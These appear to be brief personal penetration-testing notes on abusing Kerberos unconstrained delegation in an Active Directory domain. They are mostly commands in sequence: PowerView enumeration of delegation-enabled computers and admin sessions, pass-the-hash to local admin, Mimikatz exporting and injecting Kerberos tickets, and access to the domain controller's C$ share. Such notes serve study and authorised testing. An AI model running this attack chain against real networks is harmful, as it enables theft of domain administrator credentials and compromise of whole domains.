kerberos delegation allows to "reuse the end-user credentials to access resources hosted on a different server"

-Discover domain computers which have unconstrained delegation enabled using PowerView:

Get-NetComputer -UnConstrained

-Compromise the server(s) where Unconstrained delgation is enabled.

--run as the user with admin privileges on one of the computer found in get-netcomputer -unconstrained (computername - PTH as local admin there)

---Find-LocalAdminAccess (it'll find to appsrv which is a computer with unconstrained delegation enabled)

---Enter the computername session (unconstrained delegation enabled computer)

Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

-not on target computer (unconstrained delegated)

Invoke-UserHunter -ComputerName subdomain-unconstrainedDelegatedComputer -Poll 100 -UserName Administrator -Delay 5

Invoke-Mimikatz -Command '"kerberos::ptt ticket-Administrator@krbtgt"'

ls \\subdomain-dc.subdomain.domain.local\c$ can be accessible
